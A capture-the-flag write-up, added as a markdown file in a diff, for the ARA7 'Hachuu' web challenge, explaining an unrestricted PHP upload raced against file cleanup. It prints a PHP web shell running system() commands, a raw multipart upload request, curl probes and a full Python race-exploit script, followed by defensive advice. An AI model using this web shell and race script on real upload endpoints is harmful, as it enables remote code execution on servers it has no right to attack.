@@ -1,0 +1,318 @@
+---
+title: 'Qualification ARA 7.0 - Hachuu'
+description: 'File upload race condition challenge.'
+date: 2026-03-17
+category: 'qualification-ara-7-0'
+discipline: 'web-exploit'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+Hachuu was a nice reminder that insecure file upload challenges do not always give immediate code execution. Sometimes the bug is obvious, but the real task is finding a way to beat the defensive timing around it. In this challenge, the upload endpoint accepted a PHP file, renamed it with a random prefix, leaked that new filename in the redirect message, and then somehow made the uploaded script disappear almost immediately. That behavior turned the challenge into a race.
+
+## Challenge Information
+
+- Category: Web Exploitation
+- Difficulty: Medium (subjective)
+- Event: ARA7 CTF Qualifications
+- Attachments / source code: `upload.php`, plus a local solver and archived notes
+- Goal: Upload a PHP payload, win the execution race, and read the flag
+
+## Initial Analysis
+
+The core file provided for analysis was `upload.php`. Even without the rest of the application, that single file already revealed most of the important behavior:
+
+```php
+$uploadDir = "uploads/";
+$fileName = basename($_FILES["imageFile"]["name"]);
+
+$randomPrefix = bin2hex(random_bytes(4));
+$uploadPath = $uploadDir . $randomPrefix . "_" . $fileName;
+
+$fileType = strtolower(pathinfo($uploadPath, PATHINFO_EXTENSION));
+$checksumPath = $uploadPath . '.txt';
+
+if (move_uploaded_file($_FILES["imageFile"]["tmp_name"], $uploadPath)) {
+    $content = file_get_contents($uploadPath);
+    $hash = hash('sha256', $content);
+    file_put_contents($checksumPath, $hash);
+    $message = "Success: File uploaded as " . basename($uploadPath);
+}
+```
+
+A few observations immediately stood out:
+
+- the uploaded file was moved directly into a web-accessible `uploads/` directory
+- the extension was parsed into `$fileType`, but never actually validated
+- the final randomized filename was revealed back to the user
+- the app stored a checksum file, but did not perform any security check with it
+
+If this script were the whole story, uploading `shell.php` should have been enough. But the original notes and solver made it clear that directly browsing to the uploaded PHP file usually returned `404 Not Found` almost immediately after the upload. That meant the intended challenge was not just unrestricted upload, but unrestricted upload with a very small time-of-use window.
+
+The anti-automation measures in the same file supported that theory:
+
+```php
+$rate_limit_window = 5;
+$max_uploads = 10;
+usleep(rand(100000, 500000));
+```
+
+So the challenge author was explicitly trying to make precise timing harder by:
+
+- limiting uploads per session
+- adding 100-500 ms of random server-side delay
+- renaming files to unpredictable paths
+
+## Recon / Enumeration
+
+Because the service was already offline, the recon phase here is reconstructed from the source and the saved solver rather than fresh live probing. If the challenge had still been up, these are the first checks I would have repeated:
+
+```bash
+curl -i http://chall-ctf.ara-its.id:6005/
+curl -i -F 'imageFile=@shell.php;type=application/octet-stream' \
+  -F 'submit=Upload' \
+  http://chall-ctf.ara-its.id:6005/upload.php
+```
+
+The important behavior from the saved notes was:
+
+- the server accepted a `.php` upload
+- the response was a `302` redirect
+- the `Location` header contained a success message that leaked the randomized filename
+- visiting `/uploads/<random>_shell.php` sometimes failed with `404`
+- but in a narrow window, the file could still be requested and executed
+
+That gives a very specific exploitation model:
+
+1. Upload the PHP payload.
+2. Read the randomized filename as fast as possible.
+3. Request the uploaded file immediately.
+4. Repeat until the request lands before cleanup or blocking happens.
+
+This is why there was no need for directory brute forcing. The application already told us the exact filename. The only real unknown was timing.
+
+## Vulnerability Discovery
+
+The vulnerability was an unrestricted file upload combined with a race condition.
+
+### Why the upload was dangerous
+
+The application never enforced an allowlist of safe extensions. It computed the extension:
+
+```php
+$fileType = strtolower(pathinfo($uploadPath, PATHINFO_EXTENSION));
+```
+
+but then did nothing with it.
+
+That means a file named `shell.php` was treated the same way as `cat.png`. From a security point of view, this is the most important bug in the challenge. A user-controlled file is written directly into a web-served directory with its chosen extension intact.
+
+### Why a race was required
+
+The source code we have does not delete the uploaded file. So the disappearing `.php` behavior must have happened somewhere outside `upload.php`, such as:
+
+- a cleanup process removing dangerous files
+- a watcher reacting to suspicious uploads
+- a web server rule making access fail after a short delay
+
+The exact mechanism matters less than the observable effect: there was a brief period where the file existed and could execute, followed by a failure state. That is the textbook shape of a TOCTOU window.
+
+### Why the redirect leak mattered
+
+The random prefix was meant to make uploaded paths unpredictable:
+
+```php
+$randomPrefix = bin2hex(random_bytes(4));
+$uploadPath = $uploadDir . $randomPrefix . "_" . $fileName;
+```
+
+But that defense was canceled out by the success message:
+
+```php
+$message = "Success: File uploaded as " . basename($uploadPath);
+header("Location: index.php?message=" . urlencode($message));
+```
+
+So instead of brute forcing the prefix, we could read the final filename directly from the `Location` header of the `302` response.
+
+In practice, that made the attack pipeline:
+
+- upload
+- parse `Location`
+- immediately request `/uploads/<known filename>`
+
+## Exploitation
+
+The solve was all about minimizing wasted time between the POST and the GET.
+
+### Step 1: Prepare a minimal PHP payload
+
+The payload only needed to read common flag locations:
+
+```php
+<?php system("cat /flag; cat /flag.txt; find / -name 'flag*'"); ?>
+```
+
+This is intentionally simple. In a race condition, the payload should do the minimum needed to prove execution and print the flag.
+
+### Step 2: Upload `shell.php`
+
+The upload request was a normal multipart form submission:
+
+```http
+POST /upload.php HTTP/1.1
+Host: chall-ctf.ara-its.id:6005
+Content-Type: multipart/form-data; boundary=----x
+
+------x
+Content-Disposition: form-data; name="imageFile"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php system("cat /flag; cat /flag.txt; find / -name 'flag*'"); ?>
+------x
+Content-Disposition: form-data; name="submit"
+
+Upload
+------x--
+```
+
+The endpoint accepted it and returned a redirect instead of an HTML page we needed to parse.
+
+### Step 3: Parse the randomized filename from the redirect
+
+This was one of the most important optimization points. The saved solver did not follow redirects. Instead, it read the `Location` header immediately:
+
+```python
+response = s.post(UPLOAD_URL, files=files, data=data, allow_redirects=False)
+redirect_url = response.headers["Location"]
+```
+
+Then it extracted the final stored filename with a regex:
+
+```python
+match = re.search(
+    r'message=Success.*as\+([a-f0-9]+_' + re.escape(filename) + ')',
+    redirect_url,
+)
+```
+
+This is faster than requesting another page and parsing a success banner from HTML. In a race, even small delays matter.
+
+### Step 4: Reuse the same session and immediately request the uploaded file
+
+The solver kept a single `requests.Session()` alive:
+
+```python
+s = requests.Session()
+```
+
+That matters because it allows TCP connection reuse. Reusing the same session avoids extra handshake overhead and makes the GET request slightly faster.
+
+Once the filename was known, the next request was sent immediately:
+
+```python
+resp = s.get(f"{BASE_URL}/uploads/{uploaded_filename}")
+```
+
+If the timing was good, the PHP payload executed before the file disappeared or became inaccessible.
+
+### Step 5: Repeat until the race is won
+
+This was not a one-shot exploit. The provided solver looped through multiple attempts:
+
+```python
+for i in range(attempts):
+    response = s.post(UPLOAD_URL, files=files, data=data, allow_redirects=False)
+    ...
+    resp = s.get(f"{BASE_URL}/uploads/{uploaded_filename}")
+```
+
+That makes sense for this challenge:
+
+- server-side random delay adds noise
+- cleanup timing is not fully predictable
+- rate limiting reduces the number of useful attempts per session window
+
+So the solve strategy is simply to keep the exploit tight and let repetition handle the timing variance.
+
+## Working Exploit Script
+
+Below is a cleaned-up version of the archived solve logic:
+
+```python
+#!/usr/bin/env python3
+
+import re
+import requests
+
+BASE_URL = "http://chall-ctf.ara-its.id:6005"
+UPLOAD_URL = f"{BASE_URL}/upload.php"
+
+s = requests.Session()
+filename = "shell.php"
+payload = '<?php system("cat /flag; cat /flag.txt; find / -name \\'flag*\\'"); ?>'
+
+files = {"imageFile": (filename, payload, "application/octet-stream")}
+data = {"submit": "Upload"}
+
+for attempt in range(20):
+    response = s.post(UPLOAD_URL, files=files, data=data, allow_redirects=False)
+    if response.status_code != 302:
+        continue
+
+    redirect_url = response.headers.get("Location", "")
+    match = re.search(
+        r"message=Success.*as\\+([a-f0-9]+_" + re.escape(filename) + r")",
+        redirect_url,
+    )
+
+    if not match:
+        continue
+
+    uploaded_filename = match.group(1)
+    resp = s.get(f"{BASE_URL}/uploads/{uploaded_filename}")
+
+    if resp.status_code == 200 and "ARA7{" in resp.text:
+        flag = re.search(r"ARA7\\{[^}]+\\}", resp.text)
+        if flag:
+            print(flag.group(0))
+            break
+```
+
+The important parts are not the Python details themselves, but the timing choices behind them:
+
+- `allow_redirects=False` to avoid extra round trips
+- `requests.Session()` to reuse the connection
+- immediate GET after parsing the filename
+- repeated attempts to win the race window
+
+## Getting the Flag
+
+Once the GET request landed before the uploaded PHP file vanished, the payload executed and printed the flag:
+
+```text
+ARA7{gr4ttzzz_y0u_l34rn3d_r4c3_c0nd1t10n_thr0ugh_f1l3_upl04d_anarchist_was_hereeee}
+```
+
+From the saved notes, the flag was obtained by reading standard flag paths from the filesystem rather than through any application-specific endpoint.
+
+## Key Takeaways
+
+- The primary bug was unrestricted file upload into a web-accessible directory.
+- The challenge became interesting because execution was only possible in a narrow race window.
+- Randomized filenames do not help if the application leaks the final stored filename right back to the attacker.
+- Anti-automation controls like rate limiting and random sleep increase difficulty, but they do not fix unsafe upload design.
+
+From a defensive perspective, the application should have:
+
+- enforced a strict allowlist of safe file extensions and MIME types
+- stored uploads outside the web root
+- renamed files to non-executable extensions
+- avoided returning sensitive storage paths to the user
+- blocked script execution in upload directories at the web server level
+
+## Final Thoughts
+
+Hachuu was a straightforward concept with a better-than-average twist. The upload bug itself was easy to spot, but the real solve depended on understanding that the challenge author wanted a timing attack, not just a normal web shell upload. That made the writeup more interesting than a basic unrestricted upload challenge.
